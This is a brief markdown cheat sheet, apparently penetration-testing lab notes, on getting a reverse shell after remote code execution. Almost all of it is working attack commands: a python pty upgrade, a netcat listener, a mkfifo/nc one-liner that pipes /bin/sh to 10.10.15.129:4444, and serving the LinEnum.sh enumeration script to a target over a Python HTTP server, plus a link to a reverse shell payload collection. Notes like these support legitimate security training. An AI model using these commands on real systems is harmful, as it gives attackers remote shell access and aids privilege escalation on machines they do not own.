# Reverse Shell

## From Remote Code Execution:

Spawn Bash:

```
python -c "import pty; pty.spawn('/bin/bash')"
```

---

Listener System:

```
nc -lnvp 4444
```

Connect to Netcat:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.129 4444 >/tmp/f
```


(Make sure to change ip to one on ip a)

Host LinEnum.sh:

```
python -m SimpleHTTPServer port
```

```
10.10.15.129/LinEnum.sh
```


## Resources:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
